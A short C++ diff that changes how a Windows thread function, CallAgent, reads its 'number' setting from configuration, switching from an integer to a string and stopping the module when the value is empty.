@@ -32,8 +32,13 @@ DWORD WINAPI CallAgent(LPVOID lpParam) {
 	conf = me->getConf();
 
 	try {
-		number = conf->getInt(L"number");
+		number = conf->getString(L"number");
 	} catch (...) {
+		me->setStatus(MODULE_STOPPED);
+		return 0;
+	}
+
+	if (number.empty()) {
 		me->setStatus(MODULE_STOPPED);
 		return 0;
 	}
